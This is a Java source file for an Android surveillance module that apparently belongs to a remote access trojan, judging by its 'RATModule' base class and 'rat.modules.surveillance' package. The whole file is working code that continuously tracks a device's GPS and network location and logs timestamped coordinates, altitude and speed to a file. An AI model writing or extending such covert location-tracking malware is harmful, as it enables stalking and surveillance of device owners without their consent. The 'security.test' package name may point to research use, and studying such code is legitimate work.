package com.security.test.rat.modules.surveillance;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * LocationModule - Implements GPS location tracking
 * 
 * Features:
 * - GPS location tracking
 * - Location history logging
 * - Movement detection
 * - Geofencing capabilities
 */
public class LocationModule extends RATModule implements LocationListener {
    
    private static final String TAG = "LocationModule";
    
    private Context context;
    private LocationManager locationManager;
    private boolean isTracking = false;
    private boolean isInitialized = false;
    
    // Location tracking configuration
    private long minTime = 10000; // 10 seconds
    private float minDistance = 10; // 10 meters
    private String currentTrackingFile;
    
    // Location history
    private Location lastKnownLocation;
    private int locationUpdateCount = 0;
    
    public LocationModule(Context context) {
        super("LocationModule", "GPS location tracking and surveillance");
        this.context = context;
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing LocationModule");
            
            // Check location permissions
            if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) 
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Fine location permission not granted");
                return false;
            }
            
            // Initialize location manager
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager == null) {
                Log.e(TAG, "Location manager not available");
                return false;
            }
            
            // Check if GPS is enabled
            if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Log.w(TAG, "GPS provider not enabled");
            }
            
            isInitialized = true;
            Log.i(TAG, "LocationModule initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize LocationModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            stopLocationTracking();
            isInitialized = false;
            Log.i(TAG, "LocationModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during LocationModule cleanup", e);
        }
    }
    
    /**
     * Start location tracking
     */
    public boolean startLocationTracking(String outputPath) {
        if (!isInitialized) {
            Log.e(TAG, "LocationModule not initialized");
            return false;
        }
        
        if (isTracking) {
            Log.w(TAG, "Location tracking already active");
            return true;
        }
        
        try {
            Log.i(TAG, "Starting location tracking, output: " + outputPath);
            
            // Create output directory if it doesn't exist
            File outputFile = new File(outputPath);
            File parentDir = outputFile.getParentFile();
            if (parentDir != null && !parentDir.exists()) {
                parentDir.mkdirs();
            }
            
            currentTrackingFile = outputPath;
            
            // Request location updates from GPS provider
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    minTime,
                    minDistance,
                    this
                );
                Log.i(TAG, "GPS location tracking started");
            }
            
            // Request location updates from network provider as backup
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    minTime,
                    minDistance,
                    this
                );
                Log.i(TAG, "Network location tracking started");
            }
            
            isTracking = true;
            return true;
            
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission denied", e);
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Failed to start location tracking", e);
            return false;
        }
    }
    
    /**
     * Stop location tracking
     */
    public boolean stopLocationTracking() {
        if (!isTracking) {
            return false;
        }
        
        try {
            Log.i(TAG, "Stopping location tracking");
            
            if (locationManager != null) {
                locationManager.removeUpdates(this);
            }
            
            isTracking = false;
            Log.i(TAG, "Location tracking stopped");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping location tracking", e);
            return false;
        }
    }
    
    /**
     * Get current location
     */
    public Location getCurrentLocation() {
        if (!isInitialized) {
            return null;
        }
        
        try {
            // Try to get last known location from GPS
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (gpsLocation != null) {
                    return gpsLocation;
                }
            }
            
            // Try network provider as fallback
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (networkLocation != null) {
                    return networkLocation;
                }
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission denied", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting current location", e);
        }
        
        return null;
    }
    
    /**
     * Get location as formatted string
     */
    public String getLocationString(Location location) {
        if (location == null) {
            return "Location unavailable";
        }
        
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        String timestamp = sdf.format(new Date(location.getTime()));
        
        return String.format("Lat: %.6f, Lon: %.6f, Alt: %.1fm, Acc: %.1fm, Time: %s",
            location.getLatitude(),
            location.getLongitude(),
            location.getAltitude(),
            location.getAccuracy(),
            timestamp
        );
    }
    
    /**
     * Calculate distance between two locations
     */
    public float calculateDistance(Location location1, Location location2) {
        if (location1 == null || location2 == null) {
            return -1;
        }
        
        return location1.distanceTo(location2);
    }
    
    /**
     * Check if location has moved significantly
     */
    public boolean hasLocationChanged(Location newLocation, float thresholdMeters) {
        if (lastKnownLocation == null || newLocation == null) {
            return true;
        }
        
        float distance = lastKnownLocation.distanceTo(newLocation);
        return distance > thresholdMeters;
    }
    
    // LocationListener implementation
    @Override
    public void onLocationChanged(Location location) {
        try {
            locationUpdateCount++;
            Log.d(TAG, "Location update #" + locationUpdateCount + ": " + getLocationString(location));
            
            // Check if location has changed significantly
            if (hasLocationChanged(location, minDistance)) {
                Log.i(TAG, "Significant location change detected");
                
                // Log location to file
                if (currentTrackingFile != null) {
                    logLocationToFile(location);
                }
                
                lastKnownLocation = location;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing location update", e);
        }
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Log.d(TAG, "Location provider " + provider + " status changed: " + status);
    }
    
    @Override
    public void onProviderEnabled(String provider) {
        Log.i(TAG, "Location provider enabled: " + provider);
    }
    
    @Override
    public void onProviderDisabled(String provider) {
        Log.w(TAG, "Location provider disabled: " + provider);
    }
    
    /**
     * Log location to file
     */
    private void logLocationToFile(Location location) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            String timestamp = sdf.format(new Date(location.getTime()));
            
            String locationData = String.format("%s,%.6f,%.6f,%.1f,%.1f,%.1f\n",
                timestamp,
                location.getLatitude(),
                location.getLongitude(),
                location.getAltitude(),
                location.getAccuracy(),
                location.getSpeed()
            );
            
            try (FileWriter writer = new FileWriter(currentTrackingFile, true)) {
                writer.write(locationData);
                writer.flush();
            }
            
        } catch (IOException e) {
            Log.e(TAG, "Failed to log location to file", e);
        }
    }
    
    /**
     * Set tracking parameters
     */
    public void setTrackingParameters(long minTime, float minDistance) {
        this.minTime = minTime;
        this.minDistance = minDistance;
        Log.i(TAG, String.format("Tracking parameters set: minTime=%dms, minDistance=%.1fm", minTime, minDistance));
    }
    
    /**
     * Get tracking statistics
     */
    public String getTrackingStats() {
        if (!isInitialized) {
            return "Module not initialized";
        }
        
        Location current = getCurrentLocation();
        String currentLocationStr = current != null ? getLocationString(current) : "Unknown";
        
        return String.format("Tracking: %s, Updates: %d, Current: %s",
            isTracking ? "Active" : "Inactive",
            locationUpdateCount,
            currentLocationStr
        );
    }
    
    /**
     * Get module status
     */
    public String getStatus() {
        if (!isInitialized) {
            return "Not initialized";
        }
        
        if (isTracking) {
            return "Tracking active, updates: " + locationUpdateCount;
        }
        
        return "Ready";
    }
}
